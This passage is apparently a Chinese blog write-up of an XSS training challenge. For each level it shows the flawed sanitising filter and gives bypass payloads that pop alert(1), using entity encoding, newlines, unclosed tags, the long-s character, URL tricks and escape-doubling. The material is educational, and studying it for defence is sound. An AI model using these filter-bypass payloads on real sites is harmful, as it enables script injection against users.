class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>   图片解析错误时，会触发这个告警</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/72bbe32aa552d4079d93a3c8e71c8212.png"></p><h3 id="0x04-实体编码绕过"><a href="#0x04-实体编码绕过" class="headerlink" title="0x04 实体编码绕过"></a>0x04 实体编码绕过</h3><p>上面的 payload 可以直接打</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;alert&amp;#40;1&amp;#41;&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">text</span> <span class="attr">onclick</span>=<span class="string">&quot;alert<span class="symbol">&amp;#40;</span>1&amp;#41&quot;</span>&gt;</span> 点击一下<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="0x05-注释绕过"><a href="#0x05-注释绕过" class="headerlink" title="0x05 注释绕过"></a>0x05 注释绕过</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/godicee/img/main/6583e3a87e14c182b444c2806b02682f.png"></h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/38dcd5c62f1f21a7fc793249030746d8.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="0x06-换行符绕过"><a href="#0x06-换行符绕过" class="headerlink" title="0x06 换行符绕过"></a>0x06 换行符绕过</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/47681f4a4b655b7447ddeed53395fad7.png"></p><ul><li>匹配了<ul><li>auto</li><li>onxxxxx&#x3D;</li><li><blockquote></blockquote></li></ul></li><li>不区分大小写&amp;全局</li></ul><p>正则只会匹配一行的内容：用换行符过滤</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c3a01af59236252011c80199de54b05d.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onclick</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">onmouseover</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">onmouseover</span><br><span class="line">=alert&amp;#<span class="number">40</span>;<span class="number">1</span>&amp;#<span class="number">41</span></span><br></pre></td></tr></table></figure><h3 id="0x07-非闭合标签绕过"><a href="#0x07-非闭合标签绕过" class="headerlink" title="0x07 非闭合标签绕过"></a>0x07 非闭合标签绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配所有的标签，删除它和它里面的内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line">&lt;\/? 匹配结束标签or开始标签：？表示0或1次</span><br><span class="line">[^&gt;]+匹配任意除&gt;的字符</span><br><span class="line">&gt;匹配最后一个闭合符</span><br></pre></td></tr></table></figure><p>用空元素标签绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">&lt;input onmouseover=<span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">&lt;input onclick=<span class="string">&#x27;alert(1)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/8fbc51c945e168283e999d864ba323b0.png"></p><h3 id="0x08-换行绕过"><a href="#0x08-换行绕过" class="headerlink" title="0x08 换行绕过"></a>0x08 换行绕过</h3><p>过滤了 style 的闭合标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">src</span>) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换行绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span></span></span></span><br></pre></td></tr></table></figure><h3 id="0x09-指定链接过滤"><a href="#0x09-指定链接过滤" class="headerlink" title="0x09 指定链接过滤"></a>0x09 指定链接过滤</h3><p>用于指向指定链接：输入的必须是指定元素的子域名<a href="https://www.segmentfault.com/">https://www.segmentfault.com</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤如下</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/8789774a93c4f8eeba99c1abcdd507b0.png"></p><p>先输入链接</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/7decbdab03a70e39492a8128312e9fcb.png"></p><p>需要闭合标签，payload 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br><span class="line">相当于只屏蔽了非标签的内容</span><br><span class="line"></span><br><span class="line">这个也可以</span><br><span class="line">https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/4aff9fd4632b28fd524336e7abe4c419.png"></p><h3 id="0x0A-重定向绕过"><a href="#0x0A-重定向绕过" class="headerlink" title="0x0A @重定向绕过"></a>0x0A @重定向绕过</h3><p>过滤了大多数字符——这些字符会被实体编码，在嵌入后会被解码——但是只会被当作字符串，不会被当作函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用重定向来过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在网址中间使用符号@</span><br><span class="line">(例如https：<span class="comment">//www.google.com@stackoverflow.com)将重定向到</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//stackoverflow.com/网站(@字符后的域URL)。</span></span><br><span class="line">其中以@分隔的话前面表示的是用户名和密码，后面表示的是登录的网站和端口</span><br><span class="line">也可以以表示重定向到第二个网站。</span><br></pre></td></tr></table></figure><p>可以用官方的测试，直接访问官方的 js 文件来弹窗，不需要重定向:payload 如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//www.segmentfault.com.haozi.me/j.js</span></span><br></pre></td></tr></table></figure><p>在本地建立文件</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e76b96e01137ce4660d09d841cdea29c.png"></p><p>上传，我这里没有成功，换了火狐也没有成功，不知道为什么</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//www.segmentfault.com@127.0.0.1/xss.js</span></span><br></pre></td></tr></table></figure><h3 id="0x0B-转为大写绕过（js编码）"><a href="#0x0B-转为大写绕过（js编码）" class="headerlink" title="0x0B 转为大写绕过（js编码）"></a>0x0B 转为大写绕过（js编码）</h3><p>html 不区分大小写，js 区分大小写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以编码绕过，但是只有触发事件的可以执行编码后的函数 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&#x27;alert(1)&#x27;</span></span><br><span class="line">编码一下</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&#x27;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&#x27;</span></span><br></pre></td></tr></table></figure><p>因为只有执行的 alert(1)是 js，所以只需要编码它就可以了，当然也可以全部都编码</p><h3 id="0x0CC"><a href="#0x0CC" class="headerlink" title="0x0CC"></a>0x0CC</h3><p>多过滤了 script 字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0D-换行-注释"><a href="#0x0D-换行-注释" class="headerlink" title="0x0D 换行&amp;注释"></a>0x0D 换行&amp;注释</h3><p>去掉了&lt;   &#x2F;    ‘   “ </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换行且注释掉后面的字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/9818a16ce2d2374911dd0cbd9ea73801.png"></p><h3 id="0x0E-特殊字符l"><a href="#0x0E-特殊字符l" class="headerlink" title="0x0E 特殊字符ſ"></a>0x0E 特殊字符<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ſ</font></h3><p>把&lt;a 替换为&lt;_a</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/e0f147812e675ce930507c10728cd6d4.png"></p><p>可以用换行逃逸捕获组，用编码逃逸变大写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">img src=<span class="number">1</span> onerror=<span class="string">&#x27;alert(1)&#x27;</span></span><br><span class="line">编码alert</span><br></pre></td></tr></table></figure><p>但是没有通过，这道题的 h1，h2 是在同一行的，不能换行逃逸</p><p>特殊字符绕过<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ſ</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/a9724fdfd708c72d30b89a6d89ba3a15.png"></p><p>在 html 里面ſ 会被替换为 s</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg/onload=<span class="string">&quot;alert`1`&quot;</span>&gt;编码alert</span><br><span class="line">&lt;ſvg/onload=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;`1`&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="0x0F-事件触发器"><a href="#0x0F-事件触发器" class="headerlink" title="0x0F 事件触发器"></a>0x0F 事件触发器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在事件触发器 onerror 中实体编码可以正常被转义为函数，正常绕过即可</p><p>1 闭合前面的 console.error</p><p>2 js 中写下一条语句，需要换行 or 分号</p><p>3 直接 alert，然后注释后面的语句即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1)//</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/2a460e865e26aebfb3e43e92b857bf64.png"></p><h3 id="0x10window-data"><a href="#0x10window-data" class="headerlink" title="0x10window.data"></a>0x10window.data</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/2b7246d7f63efc8cbbaffe8a64238c27.png"></p><h3 id="0x11-双写转义字符"><a href="#0x11-双写转义字符" class="headerlink" title="0x11 双写转义字符"></a>0x11 双写转义字符</h3><p>在每个特殊字符前面：添加了两个转义字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeJs</span> (<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(s)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = <span class="title function_">escapeJs</span>(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上，一个字符，在进行赋值的时候，会用掉一个转义字符</p><p>最开始为 s 的特殊字符前面添加了两个转义字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="title function_">escapeJs</span>(s)  s调用函数，添加了两个转义字符，并赋值给自己</span><br><span class="line">但是在赋值给自己的时候，会用掉一次转义字符</span><br></pre></td></tr></table></figure><p>相当于：只为 s 添加了一次转义字符</p><p>在下面：s 被嵌入赋值给了 url，又会用掉一次转义字符——即 url 最后拿到的 s 是没有转义字符的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到下图，转义字符已经少了一个了，在赋值完成后，又会再少一个</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a920db94f92a719fdf17dcc0d3145b2d.png"></p><p>而对于这题的逻辑如下图</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/103b619b0a34c04c5bf5296e99b62add.png"></p><p>如上图可得知，最后的 html 代码就应该是这样的形势</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;a herf=&quot;javascript:console.log(&quot;输入s&quot;)&quot;&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure><p>所以直接在如上中：闭合 javascript:console.log(“输入s”)这一段代码即可</p><p>可以有两种 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;);alert(1)//</span></span><br><span class="line"><span class="string">&quot;</span>);<span class="title function_">alert</span>(<span class="string">&quot;1</span></span><br></pre></td></tr></table></figure><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>给双引号添加了两个转义字符，s 的赋值后会少一个转义字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (<span class="params">s</span>) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即最后的 html</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;s&quot;</span>)&lt;<span class="regexp">/script&gt; 注意s中如果有&quot;会变成/</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>考虑 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;);alert(1)</span></span><br><span class="line"><span class="string">html的内容：   &lt;script&gt;console.log(&quot;</span>\<span class="string">&quot;);alert(1)&quot;</span>);&lt;/script&gt;    </span><br></pre></td></tr></table></figure><p>但是这里的双引号被转义了，变成了字符，没有闭合的作用了</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/b1a9b719db8ce25d9bb62ac0b9dad8c8.png"></p><p>可以多加一个转义字符，把”多加的一个转义字符转义掉，变为没效果的普通字符，”就可以闭合了</p><p>再注释即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&quot;);alert(1)//</span></span><br><span class="line"><span class="string">&lt;script&gt;console.log(&quot;</span>\\<span class="string">&quot;);alert(1)//&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/cc76482ee5383ce954cd74c9130c7a86.png"><img src="https://raw.githubusercontent.com/godicee/img/main/5d041690a5325f435d478715ca4c9a1a.png"></p><p>todolist：</p><p>1 